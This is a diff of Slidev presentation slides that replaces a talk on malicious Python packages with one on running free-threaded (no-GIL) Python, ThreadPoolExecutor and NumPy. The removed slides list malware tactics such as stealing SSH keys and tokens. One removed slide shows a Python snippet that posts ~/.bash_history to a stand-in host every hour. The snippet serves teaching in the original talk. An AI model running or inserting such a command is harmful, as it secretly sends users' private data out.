@@ -26,11 +26,24 @@ class: text-center quote
 }
 </style>
 
-# "Do not install untrusted packages."
+# "Python is slow."
+
+<!--
+We have all heard this said many times
+For many of us who have used Python for decades, you cannot help but bristle a little bit
+Yes, its some operations are slow, but we get have such readability and flexability
+Yes, numerical ops are also slow but we have access to excellent C-libraries like NumPy and Arrow
+But when aspect of Python performance remained hard to justify: no true CPU concurrency
+-->
+
+
+
+
+
 
 
 ---
-class: attack
+class: history
 ---
 
 # Risks of Python Package Installation
@@ -46,7 +59,7 @@ class: attack
 
 
 ---
-class: attack
+class: history
 ---
 
 # Origins of Package-Based Attacks
@@ -66,7 +79,7 @@ class: attack
 
 
 ---
-class: attack
+class: history
 ---
 
 # Why I Care
@@ -80,7 +93,7 @@ class: attack
 </v-clicks>
 
 ---
-class: attack
+class: history
 ---
 
 # Why You Should Care
@@ -94,6 +107,11 @@ class: attack
 </v-clicks>
 
 
+
+
+<!-- II -->
+
+
 ---
 layout: center
 class: text-center
@@ -101,70 +119,90 @@ class: text-center
 
 <style scoped>
 .slidev-layout {
-  background-color: #2e1a1a;
+  background-color: #1a1a2e;
   background-image: radial-gradient(rgba(255,255,255,0.05) 2px, transparent 2px);
   background-size: 48px 48px;
 }
 </style>
 
-# Mechanisms of Python Malware
+# Running Free-Threaded Python
 
-<div style="position:absolute;right:0%;bottom:-5%;font-size:450px !important;line-height:1 !important;opacity:0.03;pointer-events:none;filter:brightness(0.1) invert(1);">🔥</div>
-
+<div style="position:absolute;right:0%;bottom:-10%;font-size:450px !important;line-height:1 !important;opacity:0.03;pointer-events:none;filter:brightness(0.1) invert(1);">📦</div>
 
 
 
 ---
-class: malware
+class: history
 ---
 
-# Common Malware Tactics
+# Installing & Building
 
 <v-clicks depth=2>
 
-- Reconnaissance
-- Credential exfiltration (info-stealers)
-  - SSH keys, AWS tokens, API keys
-  - Environment variables, `.env` files
-  - Clipboard extraction
-- Data theft (source code, databases)
-- Persistence (keyloggers, backdoors)
-- Resource abuse (crypto miners, botnets)
-- Ransomware, wipers
+- Two different binaries available
+    - Python.org
+    - homebrew
+- Compiling Python with `--disable-gil`
+
+</v-clicks>
+
+
+---
+class: history
+---
+
+# Running
+
+<v-clicks depth=2>
+
+- `python3.14t`
+- Reenabling the GIL
+    - `PYTHON_GIL=1` environment variable
+    - `-X gil=1` flag at launch
 
 </v-clicks>
 
 
 
 ---
-class: malware
+class: history
 ---
 
-# Exfiltrate Shell History Every Hour
+# The Requirement of Compatible Packages
 
-```python {0|1-2|3|3-5}
-import os
-os.system('''nohup bash -c 'while true; do
-curl -s -X POST -d @~/.bash_history https://doom.org/collect;
-sleep 3600;
-done' &''')
+<v-clicks depth=2>
+
+- Binary wheels must be specially built
+- Native Python package / wheel are always compatible
+- Importing non-compatible wheels will re-enable the GIL
+
+</v-clicks>
+
+
+
+---
+class: history
+---
+
+# Building Free-Threading Compatible C-Extensions
+
+<v-clicks depth=2>
+
+- `Py_GIL_DISABLED`: constant for discovery runtime type
+- `PyUnstable_Module_SetGIL()`: register no-GIL support
+```c
+PyMODINIT_FUNC
+PyInit_mymodule(void)
+{
+    PyObject *m = PyModule_Create(&moduledef);
+    if (m == NULL) { return NULL; }
+#ifdef Py_GIL_DISABLED
+    PyUnstable_Module_SetGIL(m, Py_MOD_GIL_NOT_USED);
+#endif
+    return m;
+}
 ```
 
-
-
-
-
----
-class: history
----
-
-# Packaging & Installation Concerns
-
-<v-clicks depth=2>
-
-- Why does `setup.py` exist and do we still need it?
-- What does `site.main()` do?
-
 </v-clicks>
 
 
@@ -173,19 +211,13 @@ class: history
 class: history
 ---
 
-# The Legacy of `setup.py`
+# Compatible Does Not Mean Thread-Safe
 
 <v-clicks depth=2>
 
-- PEP 229 (2000)
-    - Establishes `setup.py` for portable C-extensions
-    - `python setup.py install` copies files to `site-packages`
-- `setup.py`
-    - Where metadata is defined until 2020
-    - Running is required for *source* installations
-- PEP 427 (2012): the Wheel (`.whl`) Binary Package Format
-    - `pip` 1.4 (2013) supports wheels
-    - Permits installation without running `setup.py`
+- Declaring `Py_MOD_GIL_NOT_USED` does not render thread safety
+- Easy to accidentally rely on the GIL
+    - Shared mutable module state
 
 </v-clicks>
 
@@ -204,7 +236,7 @@ class: text-center
 }
 </style>
 
-# Mitigations
+# Using `ThreadPoolExecutor`
 
 <div style="position:absolute;right:-5%;bottom:-5%;font-size:450px !important;line-height:1 !important;opacity:0.03;pointer-events:none;filter:brightness(0) invert(1);">🛡️</div>
 
@@ -214,14 +246,32 @@ class: text-center
 class: mitigation
 ---
 
-# Mitigations
+# Runing Threads in Python
 
 <v-clicks depth=2>
 
-- Defending PyPI
-- Avoiding `site.main()`
-- Package Screening
-- Deception Technology
+- `Thread` objects
+- Concurrent futures `ThreadPoolExecutor`
+
+</v-clicks>
+
+
+---
+class: mitigation
+---
+
+# Using `ThreadPoolExecutor`
+
+<v-clicks depth=2>
+
+- Context manager for multi-threaded processing
+― Configurable worker counts
+    - More threads can degrade performance
+- Executor `map()` processes one function with many args
+```python
+    with ThreadPoolExecutor() as ex:
+        result = list(ex.map(f, args))
+```
 
 </v-clicks>
 
@@ -232,35 +282,39 @@ class: mitigation
 class: mitigation
 ---
 
-# Mitigations: Avoiding `site.main()`
+# Multi-Threading NumPy Processes
 
 <v-clicks depth=2>
 
-- Disable `site.main()`: `python -S`
-- Manually add "site-packages" to `sys.path`
-```bash
-$ python -S
->>> import site, sys
->>> sys.path.extend(site.getsitepackages())
-```
+- Many NumPy processes are already no-GIL
+- NumPy arrays can be made immutable
+    - `flags.writeable`
+- Immutability makes data races impossible
+
 
 </v-clicks>
 
 
 
+
 ---
-layout: center
-class: text-center quote
+class: mitigation
 ---
 
-<style scoped>
-.slidev-layout {
-  background-color: #0f0f1e;
-  background-image: radial-gradient(ellipse 60% 50% at 50% 50%, rgba(60, 60, 110, 0.5) 0%, transparent 100%);
-}
-</style>
+# Using `ThreadPoolExecutor` with 2D arrays
 
-# The easiest way to get malware on your machine is to install it yourself
+<v-clicks depth=2>
+
+- `ThreadPoolExecutor.map()`
+- `numpy.from_iter()`
+― Processing rows into a 2D array
+― Processing rows into other PyObjects
+
+</v-clicks>
+
+
+
+
 
 
 ---
@@ -269,10 +323,11 @@ class: text-center quote
 
 <v-clicks depth=2>
 
-- Do not install untrusted packages
-- Lock & screen your packages
-- Avoid `setup.py`, favor `.whl`, question `site.main()`
-- Lay traps
+- Free-threading is no-longer experimental
+- Growing package support
+    ― PyPI classifier: "Programming Language :: Python :: Free Threading"
+    ― Tracking top 360: https://hugovk.github.io/free-threaded-wheels/
+- Adoption can be difficult
 
 </v-clicks>
 
